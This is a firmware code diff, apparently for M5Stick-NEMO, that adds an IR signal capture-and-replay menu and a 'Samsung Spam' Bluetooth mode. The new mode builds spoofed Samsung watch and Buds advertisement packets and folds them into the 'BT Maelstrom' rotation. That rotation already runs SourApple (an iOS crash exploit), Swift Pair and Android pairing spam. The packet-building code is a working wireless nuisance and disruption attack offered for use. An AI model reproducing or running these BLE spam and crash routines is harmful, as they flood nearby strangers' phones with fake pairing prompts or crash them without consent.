@@ -58,6 +58,7 @@ uint16_t FGCOLOR=0xFFF1; // placeholder
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
   #define IRLED 9
+  #define IRRECV 26
   #define SPEAKER M5.Beep
   #define BITMAP M5.Lcd.drawBitmap(0, 0, M5.Lcd.width(), M5.Lcd.height(), NEMOMatrix)
   #define SD_CLK_PIN 0
@@ -89,6 +90,7 @@ uint16_t FGCOLOR=0xFFF1; // placeholder
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
   #define IRLED 19
+  #define IRRECV 26
   #define BITMAP M5.Lcd.drawBmp(NEMOMatrix, 97338)
   #define M5_BUTTON_MENU 35
   #define M5_BUTTON_HOME 37
@@ -122,6 +124,7 @@ uint16_t FGCOLOR=0xFFF1; // placeholder
   // -=-=- ALIASES -=-=-
   #define DISP M5.Lcd
   #define IRLED 9
+  #define IRRECV 26
   #define BITMAP Serial.println("unsupported")
   #define SD_CLK_PIN 0
   #define SD_MISO_PIN 36
@@ -149,6 +152,7 @@ uint16_t FGCOLOR=0xFFF1; // placeholder
   // -=-=- ALIASES -=-=-
   #define DISP M5Cardputer.Display
   #define IRLED 44
+  #define IRRECV 1
   #define BACKLIGHT 38
   #define MINBRIGHT 165
   #define SPEAKER M5Cardputer.Speaker
@@ -225,7 +229,8 @@ const String contributors[] PROGMEM = {
   "@vladimirpetrov",
   "@vs4vijay",
   "@danny8972",
-  "@AH2005NA"
+  "@AH2005NA",
+  "@FlasherTwelve"
 };
 
 int advtime = 0; 
@@ -239,6 +244,7 @@ bool rstOverride = false;   // Reset Button Override. Set to true when navigatin
 bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
 bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
+bool samsungSpam = false;
 bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
 bool portal_active = false; // Internal flag used to ensure Evil Portal exits cleanly
 bool activeQR = false; 
@@ -277,6 +283,7 @@ bool clone_flg = false;
 #include "songs.h"
 #include "localization.h"
 #include "IRextra.h"
+#include "ir_replay.h"
 #include <BLEUtils.h>
 #include <BLEServer.h>
 #if defined(DEAUTHER)
@@ -435,6 +442,7 @@ MENU mmenu[] = {
   { TXT_CLOCK, 0},
 #endif
   { "TV-B-Gone", 13}, // We jump to the region menu first
+  { "IR Receiver", 24},
   { "Bluetooth", 16},
   { "WiFi", 12},
   { "QR Codes", 18},
@@ -442,25 +450,7 @@ MENU mmenu[] = {
 };
 int mmenu_size = sizeof(mmenu) / sizeof(MENU);
 
-void mmenu_setup() {
-  cursor = 0;
-  rstOverride = true;
-  drawmenu(mmenu, mmenu_size);
-  delay(500); // Prevent switching after menu loads up
-}
-
-void mmenu_loop() {
-  if (check_next_press()) {
-    cursor++;
-    cursor = cursor % mmenu_size;
-    drawmenu(mmenu, mmenu_size);
-    delay(250);
-  }
-  if (check_select_press()) {
-    rstOverride = false;
-    isSwitching = true;
-    current_proc = mmenu[cursor].command;
-  }
+void menu_extras() {
   /* Stupid line */
     DISP.drawLine(0, DISP.height()-25, DISP.width(), DISP.height()-25, FGCOLOR);
   /* TIME */
@@ -506,7 +496,29 @@ void mmenu_loop() {
   #endif
   DISP.print("%");
   DISP.setTextColor(FGCOLOR, BGCOLOR);
-  /* BATTERY */
+}
+
+void mmenu_setup() {
+  cursor = 0;
+  rstOverride = true;
+  drawmenu(mmenu, mmenu_size);
+  menu_extras();
+  delay(500); // Prevent switching after menu loads up
+}
+
+void mmenu_loop() {
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % mmenu_size;
+    drawmenu(mmenu, mmenu_size);
+    menu_extras();
+    delay(250);
+  }
+  if (check_select_press()) {
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = mmenu[cursor].command;
+  }
 }
 
 bool screen_dim_dimmed = false;
@@ -875,7 +887,7 @@ void theme_loop() {
     cursor = cursor % thmenu_size;
     switch (thmenu[cursor].command){
       case 0:
-        FG=11;
+        FG=14;
         BG=1;
         break;       
       case 1: // Nemo
@@ -1145,6 +1157,50 @@ int rotation = 1;
   }
 #endif // Cardputer
 
+/// IR Receiver ///
+
+MENU recvmenu[] = {
+  { TXT_BACK, 3},
+  { "IR Receiver", 0},
+  { "IR Sender", 1},
+};
+int recvmenu_size = sizeof(recvmenu) / sizeof (MENU);
+
+void receiver_setup() {
+  setupReceiver();
+  cursor = 0;
+  rstOverride = true;
+  drawmenu(recvmenu, recvmenu_size);
+  delay(500);
+}
+
+void receiver_loop() {
+  if (check_next_press()) {
+    cursor++;
+    cursor = cursor % recvmenu_size;
+    delay(250);
+    drawmenu(recvmenu, recvmenu_size);
+  }
+  if (check_select_press()) {
+    int option = recvmenu[cursor].command;
+    if(option == 0) {
+      receiveSignal();
+    } else if(option == 1) {
+      sendSignal();
+      digitalWrite(IRLED, M5LED_OFF);
+    } else if (option == 3) {
+      current_proc = 1;
+      isSwitching = true;
+      rstOverride = false; 
+      return;
+    }
+    current_proc = 24;
+    isSwitching = true;
+    rstOverride = false; 
+    return;
+  }
+}
+
 /// TV-B-GONE ///
 void tvbgone_setup() {
   DISP.fillScreen(BGCOLOR);
@@ -1409,6 +1465,7 @@ MENU btmenu[] = {
   { "AppleJuice", 0},
   { "Swift Pair", 1},
   { "Android Spam", 4},
+  { "Samsung Spam", 6},
   { TXT_SA_CRASH, 2},
   { "BT Maelstrom", 3},
 };
@@ -1420,6 +1477,7 @@ void btmenu_setup() {
   swiftPair = false;
   maelstrom = false;
   androidPair = false;
+  samsungSpam = false;
   rstOverride = true;
   drawmenu(btmenu, btmenu_size);
   delay(500); // Prevent switching after menu loads up
@@ -1489,6 +1547,14 @@ void btmenu_loop() {
         isSwitching = true;
         current_proc = 1;
         break;
+
+      case 6:
+        samsungSpam = true;
+        current_proc = 9; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        DISP.print("Samsung Spam");
+        DISP.print(TXT_SEL_EXIT2);
     }
   }
 }
@@ -1554,6 +1620,7 @@ void aj_setup(){
   sourApple = false;
   swiftPair = false;
   maelstrom = false;
+  samsungSpam = false;
   rstOverride = true;
   drawmenu(ajmenu, ajmenu_size);
 }
@@ -1693,7 +1760,7 @@ void aj_adv(){
   // Isolating this to its own process lets us take advantage 
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
-  if (sourApple || swiftPair || androidPair || maelstrom){
+  if (sourApple || swiftPair || androidPair || maelstrom || samsungSpam){
     delay(20);   // 20msec delay instead of ajDelay for SourApple attack
     advtime = 0; // bypass ajDelay counter
   }
@@ -1729,6 +1796,7 @@ void aj_adv(){
         Serial.printf("%02x", packet[i]);
       }
       Serial.println("");
+      
     } else if (swiftPair) {
       const char* display_name = generateRandomName();
       Serial.printf(TXT_SP_ADV, display_name);
@@ -1780,6 +1848,52 @@ void aj_adv(){
         Serial.printf("%02x", packet[i]);
       }
       Serial.println("");
+    } else if (samsungSpam) {
+      //Code from https://github.com/Spooks4576/Ghost_ESP/blob/main/src/components/ble_module/ble_module.h
+
+      Serial.print(TXT_AD_SPAM_ADV);
+      uint8_t packet[15];
+      uint8_t i = 0;
+      int randval = random(1, 2);
+
+      if (randval == 1)
+      {
+        uint8_t model = watch_models[rand() % 25].value;
+
+        packet[i++] = 14; // Size
+        packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+        packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+        packet[i++] = 0x00; // ...
+        packet[i++] = 0x01;
+        packet[i++] = 0x00;
+        packet[i++] = 0x02;
+        packet[i++] = 0x00;
+        packet[i++] = 0x01;
+        packet[i++] = 0x01;
+        packet[i++] = 0xFF;
+        packet[i++] = 0x00;
+        packet[i++] = 0x00;
+        packet[i++] = 0x43;
+        packet[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+
+        oAdvertisementData.addData(std::string((char *)packet, 15));
+      }
+      else 
+      {
+        uint8_t advertisementPacket[] = {
+          0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
+          0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
+          0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
+        };
+
+        int randomIndex = rand() % samsung_buds_count;
+        uint32_t value = buds_models[randomIndex].value;
+        advertisementPacket[17] = (value >> 24) & 0xFF;
+        advertisementPacket[18] = (value >> 16) & 0xFF;
+        advertisementPacket[20] = (value >> 8) & 0xFF;
+
+        oAdvertisementData.addData(std::string((char *)advertisementPacket, 31));
+      }
     } else {
       Serial.print(TXT_AJ_ADV);
       if (deviceType >= 18){
@@ -1802,7 +1916,7 @@ void aj_adv(){
 #endif
   }
   if (check_next_press()) {
-    if (sourApple || swiftPair || androidPair || maelstrom){
+    if (sourApple || swiftPair || androidPair || maelstrom || samsungSpam){
       isSwitching = true;
       current_proc = 16;
       drawmenu(btmenu, btmenu_size);
@@ -1814,6 +1928,8 @@ void aj_adv(){
     sourApple = false;
     swiftPair = false;
     maelstrom = false;
+    samsungSpam = false;
+    androidPair = false;
     pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
     delay(250);
   }
@@ -1962,6 +2078,8 @@ void btmaelstrom_setup(){
 void btmaelstrom_loop(){
   swiftPair = false;
   sourApple = true;
+  androidPair = false;
+  samsungSpam = true;
   aj_adv();
   if (maelstrom){
     swiftPair = true;
@@ -1973,6 +2091,14 @@ void btmaelstrom_loop(){
     swiftPair = false;
     androidPair = true;
     sourApple = false;
+    samsungSpam = false;
+    aj_adv();
+  }
+  if (maelstrom){
+    swiftPair = false;
+    androidPair = false;
+    sourApple = false;
+    samsungSpam = true;
     aj_adv();
   }
   if (maelstrom){
@@ -2492,7 +2618,7 @@ void setup() {
       EEPROM.write(1, 15);   // 15 second auto dim time
       EEPROM.write(2, 100);  // 100% brightness
       EEPROM.write(3, 0);    // TVBG NA Region
-      EEPROM.write(4, 11);   // FGColor Green
+      EEPROM.write(4, 14);   // FGColor Green
       EEPROM.write(5, 1);    // BGcolor Black
       EEPROM.commit();
     }
@@ -2640,6 +2766,9 @@ void loop() {
         case 23:
           theme_setup();
           break;
+        case 24:
+          receiver_setup();
+          break;
     }
   }
 
@@ -2730,6 +2859,9 @@ void loop() {
         break;
       case 23:
         theme_loop();
+        break;
+      case 24:
+        receiver_loop();
         break;
     #if defined(SDCARD)                                                // SDCARD M5Stick
       #ifndef CARDPUTER                                                // SDCARD M5Stick
